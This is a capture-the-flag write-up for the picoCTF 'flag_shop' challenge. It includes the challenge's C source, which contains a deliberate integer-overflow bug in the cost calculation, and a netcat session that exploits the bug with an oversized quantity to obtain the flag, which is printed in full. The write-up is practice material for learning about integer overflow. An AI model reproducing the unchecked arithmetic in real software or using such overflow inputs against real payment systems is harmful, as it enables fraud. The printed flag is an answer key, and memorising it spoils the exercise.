# picoGym Level 0049: flag_shop
Source: https://play.picoctf.org/practice/challenge/49

## Goal
There's a flag shop selling stuff, can you buy a flag? Source. <br>
Connect with nc jupiter.challenges.picoctf.org 4906.

## What I learned
```
Two's compliment can do some weird things when numbers get really big!

# Find C Headers
AsianHacker-picoctf@webshell:~$ gcc -xc -E -v - ⌨️
#include <...> search starts here:
 /usr/lib/gcc/x86_64-linux-gnu/11/include
 /usr/local/include
 /usr/include/x86_64-linux-gnu
 /usr/include
End of search list.

# Find limits.h and float.h
AsianHacker-picoctf@webshell:~$ find /usr/include -name limits.h ⌨️
/usr/include/c++/11/tr1/limits.h
/usr/include/linux/limits.h
/usr/include/limits.h

AsianHacker-picoctf@webshell:~$ find /usr/include -name float.h ⌨️
/usr/include/c++/11/tr1/float.h

AsianHacker-picoctf@webshell:~$ cat /usr/include/limits.h ⌨️
#  define CHAR_BIT      8
#  define INT_MIN       (-INT_MAX - 1)
#  define INT_MAX       2147483647

int overflow 2147483647/900 = 2386092.941 so 2386093 will give problems

cost = 900 * 900000000 = 810000000000 
    wrapped final_cost = -1748818944

balance = 1100 - (-1748818944)
balance = 1748820044
```

## Solution
```
https://webshell.picoctf.org/

AsianHacker-picoctf@webshell:~$ wget https://jupiter.challenges.picoctf.org/static/64e724ad327f83ad833d9c6baa072b1f/store.c ⌨️
--2025-08-20 13:51:36--  https://jupiter.challenges.picoctf.org/static/64e724ad327f83ad833d9c6baa072b1f/store.c
Resolving jupiter.challenges.picoctf.org (jupiter.challenges.picoctf.org)... 3.131.60.8
Connecting to jupiter.challenges.picoctf.org (jupiter.challenges.picoctf.org)|3.131.60.8|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 2888 (2.8K) [application/octet-stream]
Saving to: 'store.c'

store.c                                                    100%[======================================================================================================================================>]   2.82K  --.-KB/s    in 0s      

2025-08-20 13:51:36 (1.86 GB/s) - 'store.c' saved [2888/2888]

AsianHacker-picoctf@webshell:~$ cat store.c ⌨️
#include <stdio.h>
#include <stdlib.h>
int main()
{
    setbuf(stdout, NULL);
    int con;
    con = 0;
    int account_balance = 1100; 👀
    while(con == 0){
        
        printf("Welcome to the flag exchange\n");
        printf("We sell flags\n");

        printf("\n1. Check Account Balance\n");
        printf("\n2. Buy Flags\n");
        printf("\n3. Exit\n");
        int menu;
        printf("\n Enter a menu selection\n");
        fflush(stdin);
        scanf("%d", &menu);
        if(menu == 1){
            printf("\n\n\n Balance: %d \n\n\n", account_balance);
        }
        else if(menu == 2){
            printf("Currently for sale\n");
            printf("1. Defintely not the flag Flag\n");
            printf("2. 1337 Flag\n");
            int auction_choice;
            fflush(stdin);
            scanf("%d", &auction_choice);
            if(auction_choice == 1){ 
                printf("These knockoff Flags cost 900 each, enter desired quantity\n");
                
                int number_flags = 0;
                fflush(stdin);
                scanf("%d", &number_flags);
                if(number_flags > 0){
                    int total_cost = 0;
                    total_cost = 900*number_flags; 👀
                    printf("\nThe final cost is: %d\n", total_cost);
                    if(total_cost <= account_balance){
                        account_balance = account_balance - total_cost;
                        printf("\nYour current balance after transaction: %d\n\n", account_balance);
                    }
                    else{
                        printf("Not enough funds to complete purchase\n");
                    }   
                }
            }
            else if(auction_choice == 2){
                printf("1337 flags cost 100000 dollars, and we only have 1 in stock\n");
                printf("Enter 1 to buy one");
                int bid = 0;
                fflush(stdin);
                scanf("%d", &bid);
                
                if(bid == 1){
                    
                    if(account_balance > 100000){
                        FILE *f = fopen("flag.txt", "r");
                        if(f == NULL){

                            printf("flag not found: please run this on the server\n");
                            exit(0);
                        }
                        char buf[64];
                        fgets(buf, 63, f);
                        printf("YOUR FLAG IS: %s\n", buf);
                        }
                    else{
                        printf("\nNot enough funds for transaction\n\n\n");
                    }}
            }
        }
        else{
            con = 1;
        }
    }
    return 0;
}

AsianHacker-picoctf@webshell:~$ nc jupiter.challenges.picoctf.org 4906 ⌨️
Welcome to the flag exchange
We sell flags

1. Check Account Balance
2. Buy Flags
3. Exit

 Enter a menu selection
1 ⌨️
 Balance: 1100 

Welcome to the flag exchange
We sell flags

1. Check Account Balance
2. Buy Flags
3. Exit

 Enter a menu selection
2 ⌨️
Currently for sale
1. Defintely not the flag Flag
2. 1337 Flag
1 ⌨️
These knockoff Flags cost 900 each, enter desired quantity
900000000 ⌨️

The final cost is: -1748818944
Your current balance after transaction: 1748820044 👀

Welcome to the flag exchange
We sell flags

1. Check Account Balance
2. Buy Flags
3. Exit

 Enter a menu selection
1 ⌨️
 Balance: 1748820044 👀

Welcome to the flag exchange
We sell flags

1. Check Account Balance
2. Buy Flags
3. Exit

 Enter a menu selection
2 ⌨️
Currently for sale
1. Defintely not the flag Flag
2. 1337 Flag
2 ⌨️
1337 flags cost 100000 dollars, and we only have 1 in stock
Enter 1 to buy one1 ⌨️
YOUR FLAG IS: picoCTF{m0n3y_bag5_9c5fac9b} 🔐
Welcome to the flag exchange
We sell flags

1. Check Account Balance
2. Buy Flags
3. Exit
 Enter a menu selection
3 ⌨️
```

## Flag
picoCTF{m0n3y_bag5_9c5fac9b}

## Continue
[Continue](./picoGym0437.md)